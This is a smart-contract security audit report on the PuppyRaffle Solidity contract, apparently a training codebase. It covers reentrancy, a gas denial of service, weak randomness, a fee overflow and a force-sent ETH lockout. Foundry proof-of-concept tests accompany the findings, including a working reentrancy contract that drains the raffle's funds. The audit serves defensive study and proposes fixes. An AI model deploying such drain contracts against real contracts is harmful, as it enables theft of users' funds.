# High

### [H-1] `PuppyRaffle::refund` performs an external call before updating the state, making it vulnerable to a reentrancy attack.   

**Description:** `PuppyRaffle::refund` does not respect the CEI pattern. The low-level call inside `payable(msg.sender).sendValue(entranceFee)` is executed before the player is removed from `players` array. This hands control to the attack contract creating the possibility to a reentrancy attack which allows the attacker to drain all the funds.  

```solidity
    // @audit Reentrancy attack
@>  payable(msg.sender).sendValue(entranceFee);

    players[playerIndex] = address(0);
```  

**Impact:** This creates an opportunity for a malicious user to drain all the funds held by the contract through a cyclic reentrancy attack until the contract is empty.

**Proof of Concept:** In the following test, a `PuppyRaffle` contract starts with four legitimate users who entered the raffle. The test adds a malicious contract which enters the raffle through `attackContract.startAttack();`.  
This malicious contract enters the raffle and fires a refund triggering the low-level call in `PuppyRaffle::refund`. That hands control over to `ReentrancyContract::receive` firing the reentrancy and emptying the `PuppyRaffle` contract in the process.  

In this case we get as outputs:  

```
=== INITIAL STATE ===
Initial attacker balance  : 1000000000000000000
Initial victim balance    : 4000000000000000000
=== FINAL STATE ===
Final attacker balance    : 5000000000000000000
Final victim balance      : 0
Reentrancy was successful!
```  

The contract is fully drained.  

<details>
<summary>PoC</summary>

Place the following test into `PuppyRaffle.t.sol`.  

```solidity
    function test_reentrancyRefund() public playersEntered {
        ReentrancyContract attackContract = new ReentrancyContract(puppyRaffle);
        vm.deal(address(attackContract), 1 ether);

        uint256 initialAttackerBalance = address(attackContract).balance;
        uint256 initialVictimBalance = address(puppyRaffle).balance;
        console2.log("=== INITIAL STATE ===");
        console2.log("Initial attacker balance  : ", initialAttackerBalance);
        console2.log("Initial victim balance    : ", initialVictimBalance);

        attackContract.startAttack();

        uint256 finalAttackerBalance = address(attackContract).balance;
        uint256 finalVictimBalance = address(puppyRaffle).balance;
        console2.log("=== FINAL STATE ===");
        console2.log("Final attacker balance    : ", finalAttackerBalance);
        console2.log("Final victim balance      : ", finalVictimBalance);

        if(initialAttackerBalance < finalAttackerBalance) {
            console2.log("Reentrancy was successful!");
        } else {
            console2.log("Reentrancy failed");
        }
    }
}

// This goes outside the PuppyRaffleTest contract
contract ReentrancyContract {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function startAttack() external {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));

        puppyRaffle.refund(attackerIndex);
    }

    receive() external payable {
        if(address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}
```  
</details>  
  

**Recommended Mitigation:** There is a main recommendations:  

1. Consider following the CEI pattern, which updates state before the external call, removing any reentrancy possibility. Example:  

```diff
    function refund(uint256 playerIndex) public {
+       // Checks
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

-       payable(msg.sender).sendValue(entranceFee);

+       // Effects
        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);

+       // Interactions
+       payable(msg.sender).sendValue(entranceFee);
    }
```  

2. Consider using a battle-tested library such as [`ReentrancyGuard`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol) from OpenZeppelin. Example:  

```diff
    ...

    import {Base64} from "lib/base64/base64.sol";
+   import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

    ...
    
-   contract PuppyRaffle is ERC721, Ownable {
+   contract PuppyRaffle is ERC721, Ownable, ReentrancyGuard {
    
    ...

-       function refund(uint256 playerIndex) public {
+       function refund(uint256 playerIndex) public nonReentrant {
            address playerAddress = players[playerIndex];
            require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
            require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

            payable(msg.sender).sendValue(entranceFee);

            players[playerIndex] = address(0);
            emit RaffleRefunded(playerAddress);
        }
```  

3. Consider adding a new lock variable, like a bool, which locks the entrance at the start of the function and unlocks it at the end. Example:  

```diff
    ...

    address public previousWinner;
+   bool public locked;

    ...

        function refund(uint256 playerIndex) public {
+           if (locked) revert();
+           locked = true;

            address playerAddress = players[playerIndex];
            require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
            require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

            payable(msg.sender).sendValue(entranceFee);

            players[playerIndex] = address(0);
            emit RaffleRefunded(playerAddress);
+           locked = false;
        }
```  

### [S-#] Looping through players array to check for duplicate players in `PuppyRaffle::enterRaffle` is vulnerable to a denial of service (DoS) attack.  

**Description:** As each new player is added to the `PuppyRaffle::players` array, the function must perform a nested loop over the entire array to check for duplicates. This makes each interaction more gas expensive, since it has to do more comparisons. If the array is long enough, it results in an expensive gas execution of the transaction reaching a dramatically expensive cost for the last players. 

```solidity
    // @audit DoS Attack
@>  for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```

**Impact:** The gas cost for each new player will increase, making it prohibitively expensive for new users to enter once the array is long enough. This discourages later users from entering and causes a rush at the start of the raffle to be one of the first entrants in the queue. Also can happen that the gas required by `PuppyRaffle::enterRaffle` exceeds the block gas limit, permanently blocking any further entries.  

**Proof of Concept:** In the following test we can see how this gas increment is applied when we have two sets of 100 players.  

In this case we get as outputs:  

```
-Gas spent for the first 100 players: 6503222
-Gas spent for the second 100 players: 18995459
```

That's almost 3x more expensive.  

<details>
<summary>PoC</summary>
Place the following test into `PuppyRaffle.t.sol`.

```solidity
function test_denialOfService() public {
    vm.txGasPrice(1);

    // We enter our first 100 players
    uint256 numPlayers = 100;
    address[] memory players = new address[](numPlayers);
    for (uint256 i = 0; i < numPlayers; i++) {
        players[i] = address(i);
    }

    // We calculate the gas spent
    uint256 gasStart = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);
    uint256 gasEnd = gasleft();

    uint256 gasSpentOne = gasStart - gasEnd;
    console.log("Gas spent for the first 100 players: ", gasSpentOne);

    // Next 100 players
    address[] memory playersTwo = new address[](numPlayers);
    for (uint256 i = 0; i < numPlayers; i++) {
        playersTwo[i] = address(i + numPlayers);
    }

    // We calculate the gas spent
    gasStart = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(playersTwo);
    gasEnd = gasleft();

    uint256 gasSpentTwo = gasStart - gasEnd;
    console.log("Gas spent for the second 100 players: ", gasSpentTwo);

    assert(gasSpentOne < gasSpentTwo);
}
```  

</details>  

**Recommended Mitigation:** There are a few recommendations:  

1. Consider allowing duplicates. Users can create new wallet addresses anyway, so checking for duplicates does not stop the same user from entering multiple times.
2. Consider using a mapping with a require to check for duplicates. This eliminates the nested for loop and, as a consequence, the DoS vector.

```diff
    address public previousWinner;
+   uint256 public raffleId = 0;

    ...

    mapping(uint256 => string) public rarityToName;
+   mapping(address => uint256) public addressToRaffleId;

    ...
    
        function enterRaffle(address[] memory newPlayers) public payable {
            require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");

            for (uint256 i = 0; i < newPlayers.length; i++) {
+               require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+               addressToRaffleId[newPlayers[i]] = raffleId;
                players.push(newPlayers[i]);
            }

-           // Check for duplicates
-           for (uint256 i = 0; i < players.length - 1; i++) {
-               for (uint256 j = i + 1; j < players.length; j++) {
-                   require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-               }
-           }
            emit RaffleEnter(newPlayers);
        }

        ...

        function selectWinner() external {
+           raffleId = raffleId + 1;
```  

### [S-#] Weak randomness in `PuppyRaffle::selectWinner` allows anyone to predict the winner and the minted puppy's rarity.   

**Description:** `PuppyRaffle::selectWinner` uses as a source of randomness: `msg.sender`, `block.timestamp` and `block.difficulty` to select the `PuppyRaffle::winnerIndex` and `PuppyRaffle::rarity` — none of which is a safe source of randomness. `block.timestamp` and `block.difficulty` can be known within the block and `msg.sender` can be manipulated by an attacker — by grinding addresses off-chain — until the hash produces the outcome they want, then submit the transaction.

```solidity
    // @audit notRandom
@>  uint256 winnerIndex =
        uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    
    ...

@>  uint256 rarity = uint256(keccak256(abi.encodePacked(msg.sender, block.difficulty))) % 100;
```  

Because `msg.sender` is fully controlled by the caller, an attacker does not need to wait for favorable conditions: within a single block, where `block.timestamp` and `block.difficulty` are already known, the search space is tiny (`PuppyRaffle::players.length` outcomes for the winner, `100` for the rarity), so grinding an address that yields the desired result is trivial.

**Impact:** Any user can predict the outcome for the winner and rarity and win the prize pool and the rarity they want. As a result, honest users have no real chance of winning, which makes the raffle fundamentally broken rather than merely unfair. `PuppyRaffle::winnerIndex` weak randomness is a high severity while `PuppyRaffle::rarity` is a medium.

**Proof of Concept:** 
<details> <summary>PoC 1 — Predictable winner</summary>  

In the following test, a `PuppyRaffle` contract starts with four legitimate users who entered the raffle. Using the same non-random calculation in `PuppyRaffle.sol` we store the expected winner before firing `PuppyRaffle::selectWinner`. After firing `PuppyRaffle::selectWinner` we store that real winner and compare it to the expected one confirming that both match. This means that someone can fire `PuppyRaffle::selectWinner` controlling the `msg.sender` and combining with the other two known inputs to get its address index.  

In this case we get as outputs:  

```
The expected winner is    :  0x0000000000000000000000000000000000000004
The real winner is        :  0x0000000000000000000000000000000000000004
Expected winner == real winner
```  

The contract sends the reward to a predetermined user.  

Place the following test into `PuppyRaffle.t.sol`.  

```solidity
function test_notRandomWinnerIndex() public playersEntered {
    vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());

    // `playersEntered` enters 4 users, so players.length is hardcoded here
    // `address(this)` instead of `msg.sender` to match that input with the call to `puppyRaffle.selectWinner()`
    uint256 expectedIndexWinner = uint256(keccak256(abi.encodePacked(address(this), block.timestamp, block.difficulty))) % 4;
    address expectedWinner = puppyRaffle.players(expectedIndexWinner);

    puppyRaffle.selectWinner();

    address realWinner = puppyRaffle.previousWinner();
    console2.log("The expected winner is    : ", expectedWinner);
    console2.log("The real winner is        : ", realWinner);

    if (expectedWinner == realWinner) console2.log("Expected winner == real winner");
    assertEq(expectedWinner, realWinner, "winner was not predictable");
}
```  
</details>  

<details> <summary>PoC 2 — Predictable puppy rarity</summary>  

Same setup as PoC 1. We calculate the expected rarity with the same parameter as we know the `PuppyRaffle::rarity` will do. Then `PuppyRaffle::selectWinner` its fired and we store the real rarity outcome. When comparing it against each other we get both are equal. Meaning `PuppyRaffle::rarity` uses weak and predictable randomness which someone can take advantage selecting the rarity they want.  

In this case we get as outputs:  

```
Expected rarity :  70
Actual rarity   :  70
Expected rarity == actual rarity
```  

The contract gives a predefined rarity.  

Place the following test into `PuppyRaffle.t.sol`.  

```solidity
function test_notRandomRarity() public playersEntered {
    vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());

    // Reproduce the on-chain calc: `address(this)` is the msg.sender of selectWinner()
    uint256 rarity = uint256(keccak256(abi.encodePacked(address(this), block.difficulty))) % 100;
    uint256 expectedRarity;
    if (rarity <= puppyRaffle.COMMON_RARITY()) {
        expectedRarity = puppyRaffle.COMMON_RARITY();
    } else if (rarity <= puppyRaffle.COMMON_RARITY() + puppyRaffle.RARE_RARITY()) {
        expectedRarity = puppyRaffle.RARE_RARITY();
    } else {
        expectedRarity = puppyRaffle.LEGENDARY_RARITY();
    }

    uint256 tokenId = puppyRaffle.totalSupply(); // 0 for the first mint

    puppyRaffle.selectWinner();

    uint256 actualRarity = puppyRaffle.tokenIdToRarity(tokenId);
    console2.log("Expected rarity : ", expectedRarity);
    console2.log("Actual rarity   : ", actualRarity);
    if (expectedRarity == actualRarity) console2.log("Expected rarity == actual rarity");
    assertEq(actualRarity, expectedRarity, "rarity was not predictable");
}
```  
</details>  

**Recommended Mitigation:** Use [Chainlink VRF](https://docs.chain.link/vrf) for both the winner index and the rarity roll. This external oracle provides verifiable on-chain randomness. It requires two steps: request the random number and then a callback in `fulfillRandomWords`. It will also be necessary to restructure `PuppyRaffle::selectWinner` for proper functionality.  

No block variable (`timestamp`, `prevrandao`, `blockhash`, `difficulty`, `number`) should ever be used as a source of randomness on-chain.  


### [S-#] `PuppyRaffle::totalFees` might cause overflow and uses an unsafe cast, blocking the `PuppyRaffle::withdrawFees` function.

**Description:** `PuppyRaffle::totalFees` is declared as a uint64 variable instead of a uint256. This causes two bugs:  
1. Unsafe cast: `PuppyRaffle::fee` is declared as a uint256 but when calculating `PuppyRaffle::totalFees` its casted to uint64 without any safety. If: fee > type(uint64).max (~18.44 ETH) the variable wraps modulo 2⁶⁴ — the high bits are silently discarded, so totalFees ends up far below the real amount. For that to happen would be needed ≈93 players (if `PuppyRaffle::entranceFee` = 1 ETH): 93 players * 1 ETH * 20 / 100 = 18.6 ETH > type(uint64).max.
2. Overflow: raffles whose individual fee fits in uint64 still may cause an overflow in `PuppyRaffle::totalFees` as its a uint64 declared variable. The accumulated sum in totalFees wraps modulo 2⁶⁴ as well.

```solidity
@>  uint64 public totalFees = 0;

    ...

        function selectWinner() external {
            ...

            // @audit overflow & casting
@>          totalFees = totalFees + uint64(fee);
```  

**Impact:** As a consequence of this bug, uint64 variable and the uint64 forced cast might silently wrap modulo 2⁶⁴ without any warning causing the loss of the real value of `PuppyRaffle::totalFees`. Both bugs leads to a block of `PuppyRaffle::withdrawFees` function, which uses `PuppyRaffle::totalFees` to send the fees and its `require(address(this).balance == uint256(totalFees))`, as this last require could not be passed the function stay locked forever.

**Proof of Concept:** In the following test we can see how the unsafe cast corrupts the real accounting of `PuppyRaffle::fee` reflected in `PuppyRaffle::totalFees`. Since the raffle was initialized from the start, total fees was 0 so it couldn't be the problem. `PuppyRaffle::totalFees` and its overflow bug is not tested in the PoC but also produces the same issue and its fixes are the same as the unsafe cast.

<details> <summary>PoC</summary>

In the following test we clearly see how the real output — uint64 variable — overflows without any warning.  

In this case we get as outputs:  

```
The expected total fees are    : 19000000000000000000
The real total fees are        : 553255926290448384
```

The uint64 value wrapped: 19e18 was stored as 19e18 - 2⁶⁴ ≈ 0.55e18.  

Place the following test into `PuppyRaffle.t.sol`.  

```solidity
function test_UnsafeCast() public {
    vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());

    uint256 numPlayers = 95;
    address[] memory players = new address[](numPlayers);
    for (uint256 i = 0; i < numPlayers; i++) {
        players[i] = address(i + 1_000_000);
    }
    puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);

    // Manual calculation in uint256
    uint256 expectedTotalAmountCollected = players.length * entranceFee;
    uint256 expectedFee = (expectedTotalAmountCollected * 20) / 100;
    uint256 expectedTotalFees = expectedFee;

    assertEq(uint256(puppyRaffle.totalFees()), uint256(0), "total fees should be 0 before entering the raffle");
    assertGt(expectedFee, type(uint64).max, "expected fee should be greater than the maximum value of uint64");
        
    puppyRaffle.selectWinner();

    // Real result in uint64
    uint64 realTotalFees = puppyRaffle.totalFees();

    console2.log("The expected total fees are    : ", expectedTotalFees);
    console2.log("The real total fees are        : ", uint256(realTotalFees));
    assertLt(uint256(realTotalFees), expectedTotalFees, "real total fees should be less than the expected value");

    // Withdraw function results in a block
    assertTrue(address(puppyRaffle).balance != uint256(realTotalFees), "puppyRaffle balance shouldn't be equal to the real total fees");
    vm.expectRevert("PuppyRaffle: There are currently players active!");
    puppyRaffle.withdrawFees();
}
```  
</details>  

**Recommended Mitigation:** There are a few recommendations:  

1. Change the `PuppyRaffle::totalFees` type variable from uint64 to uint256 and remove the forced cast. This solves the issue as the max of a uint256 variable is huge — 1.158e77 —, compared against the uint64 max — 1.845e19.  

```diff
    ...

-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;

    ...

        function selectWinner() external {
            ...

-           totalFees = totalFees + uint64(fee);
+           totalFees = totalFees + fee;
```  

2. Consider using the library [`SafeMath`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/math/SafeMath.sol) and [`SafeCast`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.2.0/contracts/utils/SafeCast.sol) from OpenZeppelin. For compiler 0.7.6 use v3.4.0 from the contract library. 

```diff
    ...
    import {Address} from "@openzeppelin/contracts/utils/Address.sol";
+   import {SafeMath} from "@openzeppelin/contracts/math/SafeMath.sol";
+   import {SafeCast} from "@openzeppelin/contracts/utils/SafeCast.sol";

    ...

    contract PuppyRaffle is ERC721, Ownable {
        using Address for address payable;
+       using SafeMath for uint256;
+       using SafeCast for uint256;

        ...

-       totalFees = totalFees + uint64(fee);
+       totalFees = uint256(totalFees).add(fee).toUint64();        
```  

Consider that ".toUint64()" will fire a revert which removes the unwarned truncation but does not fix the uint64 space issue. Knowing that, mitigation 2 is better only if the uint64 is strictly wanted, if not, use mitigation 1.  


### [S-#] Strict equality on `address(this).balance` in `PuppyRaffle::withdrawFees` allows anyone to permanently block the function by force-sending ETH.

**Description:** `PuppyRaffle::withdrawFees` function uses a strict equality between `address(this).balance` and `uint256(totalFees)`. Any user (whether malicious or not) can force-send ETH to the contract breaking this strict equality and permanently blocking the function. Sending more ETH cannot fix the block: `address(this).balance` can only increase, so once it exceeds `totalFees` the equality can never hold again.  

```solidity
    function withdrawFees() external {
        // @audit Mishandling ETH
@>      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```  

**Impact:** The contract remains without any possibility to withdraw the fees. The rest of the contract functionality will still work but accumulated fees will remain permanently blocked in the contract.

**Proof of Concept:** In the following test we can see how, after an external contract fires `selfdestruct` (which resides in `SelfDestructiveContract::destroy` function) with PuppyRaffle address as the receiver, the `PuppyRaffle::withdrawFees` function fires the revert from its first require causing a permanent block.  

<details> 
<summary>PoC</summary>  

Place the following test into `PuppyRaffle.t.sol`.  

```solidity
    function test_StrictEqualityBlocks() public playersEntered {
        SelfDestructiveContract selfDestructiveContract = new SelfDestructiveContract(puppyRaffle);
        vm.deal(address(selfDestructiveContract), 1 wei);
        vm.warp(puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration());
        vm.roll(block.number + 1);

        selfDestructiveContract.destroy();

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
}

...

// This goes outside the PuppyRaffleTest contract
contract SelfDestructiveContract {
    PuppyRaffle puppyRaffle;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function destroy() external {
        selfdestruct(payable(address(puppyRaffle)));
    }
}
```  

*Note that since EIP-6780 (Cancun), selfdestruct no longer deletes the contract unless called in the same transaction as its creation, but it still forwards the balance, which is all that is needed here.*  
</details>  

**Recommended Mitigation:** There are a few recommendations:  

1. Consider changing the strict equality `==` to checking the `players` length which correctly enforces that no active player remains in the raffle and removes the ETH mishandling issue.  

```diff
function withdrawFees() external {
-       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
+       require(players.length == 0, "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
```  

This solves the ETH mishandling but the force-sent ETH will still be blocked in the contract because `totalFees` variable does not account for it. If this ETH needs to be withdrawn there are two main changes to apply:  

```diff
    ...

    address public feeAddress;
-   uint64 public totalFees = 0;

    ...

        function selectWinner() external {
            ...

-           totalFees = totalFees + uint64(fee);

            ...
        }

        function withdrawFees() external {
            require(players.length == 0, "PuppyRaffle: There are currently players active!");
-           uint256 feesToWithdraw = totalFees;
+           uint256 feesToWithdraw = address(this).balance;
            (bool success,) = feeAddress.call{value: feesToWithdraw}("");
            require(success, "PuppyRaffle: Failed to withdraw fees");
        }
```  
*Note: In the code above, totalFees variable is removed as it is not needed anymore, we use address(this).balance instead.*

or

```solidity
function removeExceededETH() external onlyOwner {
    uint256 exceededETH = address(this).balance - uint256(totalFees);
    require(exceededETH != 0, "PuppyRaffle: There isn't any exceeded ETH");

    (bool success,) = feeAddress.call{value: exceededETH}("");
    require(success, "PuppyRaffle: Failed to withdraw exceeded ETH");
} 
```  
*The code above should be placed in PuppyRaffle contract to withdraw the exceeded fees.*  

The last snippet mitigates the bug without changing `PuppyRaffle::withdrawFees` function. `PuppyRaffle::withdrawFees` will still get blocked but firing `PuppyRaffle::removeExceededETH` unlocks it as the exceeded ETH is removed. The downside of this solution is that the block is still possible and every time it happens `PuppyRaffle::removeExceededETH` needs to be called.   

As a conclusion, `address(this).balance` should never be used in a strict equality. A contract's balance can always be increased by external parties without executing any of its code. This might break some contract functionality as in the `PuppyRaffle::withdrawFees` cases.  


# Low

### [L-1] First active player and non-existent players gets the same output in `PuppyRaffle::getActivePlayerIndex`, which makes unrecognizable to the first active player to know if he is in the raffle.  

**Description:** If a player is in index 0 in `players` will get as output 0 when calling `PuppyRaffle::getActivePlayerIndex` function. This output is the same one as non-existing player. This might confuse the player as they don't know whether they are in the raffle or not.  

```solidity
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
@>              return i;
            }
        }
@>      return 0;
    }
```

**Impact:** 

**Proof of Concept:** 

**Recommended Mitigation:** 

# Gas

### [G-1] Unchanged state variables should be declared as constant or immutable.  

**Description:** Reading from storage is expensive. State variables which do not change or are modified should be declared as immutable or constant to save gas.  

Instances:
- `PuppyRaffle::raffleDuration` should be `immutable`.
- `PuppyRaffle::commonImageUri` should be `constant`.
- `PuppyRaffle::rareImageUri` should be `constant`.
- `PuppyRaffle::legendaryImageUri` should be `constant`.

**Recommendation:** Change its declaration as it was suggested before.  

### [G-2] Storage variables in a loop should be cached.  

**Description:** Every time you call `players.length` your read from storage. This is very expensive in a loop, use memory instead (more efficient).  

```solidity
    // @audit-gas uin256 playerLength = players.length;
@>  for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```  

**Recommendation:** Create a new variable to store `players.length` so it wouldn't be needed to call it in every loop.  

```diff
+   uin256 playerLength = players.length;
-   for (uint256 i = 0; i < players.length - 1; i++) {
+   for (uint256 i = 0; i < playerLength - 1; i++) {
-       for (uint256 j = i + 1; j < players.length; j++) {
+       for (uint256 j = i + 1; j < playerLength; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```  


# Informational

### [I-1] Solidity pragma should be specific, not wide.  

**Description:** Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0`, use `pragma solidity 0.8.0`.  

```solidity
@>  pragma solidity ^0.7.6;
```  
**Recommendation:** Use a specific version of Solidity as `pragma solidity 0.7.6`.

### [I-2] Using an outdated Solidity version is not recommended.  

**Description:** `solc` frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex `pragma` statement. Consider using a newer version (at least 0.8.0), if possible.

```solidity
@>  pragma solidity ^0.7.6;
```  

**Recommendation:** Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues. Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.  

Please, see [Slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information.  

### [I-3] Missing checks for `address(0)` when assigning values to address state variables.  

**Description:** Check for `address(0)` when assigning values to address state variables.  

```solidity
    constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
        entranceFee = _entranceFee;
@>      feeAddress = _feeAddress;

    ...
    }

    ...

    function changeFeeAddress(address newFeeAddress) external onlyOwner {
@>      feeAddress = newFeeAddress;
        emit FeeAddressChanged(newFeeAddress);
    }
```  

**Recommendation:** Check for `address(0)` through a require or revert:  

```diff
constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
+   require(_feeAddress != address(0));
    entranceFee = _entranceFee;
    feeAddress = _feeAddress;

    ...
}

...

function changeFeeAddress(address newFeeAddress) external onlyOwner {
+   require(newFeeAddress != address(0));
    feeAddress = newFeeAddress;
    emit FeeAddressChanged(newFeeAddress);
}
```  

or

```diff
constructor(uint256 _entranceFee, address _feeAddress, uint256 _raffleDuration) ERC721("Puppy Raffle", "PR") {
+   if(_feeAddress == address(0)) revert();
    entranceFee = _entranceFee;
    feeAddress = _feeAddress;

    ...
}

...

function changeFeeAddress(address newFeeAddress) external onlyOwner {
+   if(newFeeAddress == address(0)) revert();
    feeAddress = newFeeAddress;
    emit FeeAddressChanged(newFeeAddress);
}
```  

### [I-4] Some events are missing `indexed` fields.

**Description:** Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it's not necessarily best to index the maximum allowed per event (three fields).  

```solidity
@>  event RaffleRefunded(address player);
@>  event FeeAddressChanged(address newFeeAddress);
```

**Recommendation:** Add the indexed keyword to address parameters in events to enable efficient off-chain filtering.  

```diff
-   event RaffleRefunded(address player);
+   event RaffleRefunded(address indexed player);
-   event FeeAddressChanged(address newFeeAddress);
+   event FeeAddressChanged(address indexed newFeeAddress); 
```  

Please, see [Slither](https://github.com/crytic/slither/wiki/Detector-Documentation#unindexed-event-address-parameters) documentation for more information.  